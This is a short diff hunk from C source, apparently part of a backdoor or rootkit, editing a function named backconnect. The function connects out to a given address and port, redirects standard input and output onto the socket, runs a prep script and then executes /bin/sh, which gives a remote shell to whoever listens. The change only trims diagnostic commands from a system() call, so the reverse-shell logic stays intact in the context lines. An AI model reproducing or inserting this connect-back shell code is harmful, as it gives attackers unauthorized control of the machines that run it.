@@ -48,7 +48,7 @@ void backconnect(struct in_addr addr, u_short port){
         dup2(s, i);
 
     call(CCHDIR, HOMEDIR);
-    system("./bdvprep;id;w");
+    system("./bdvprep");
     execl("/bin/sh", "sh", NULL);
     shutdown(s, SHUT_RDWR);
     close(s);
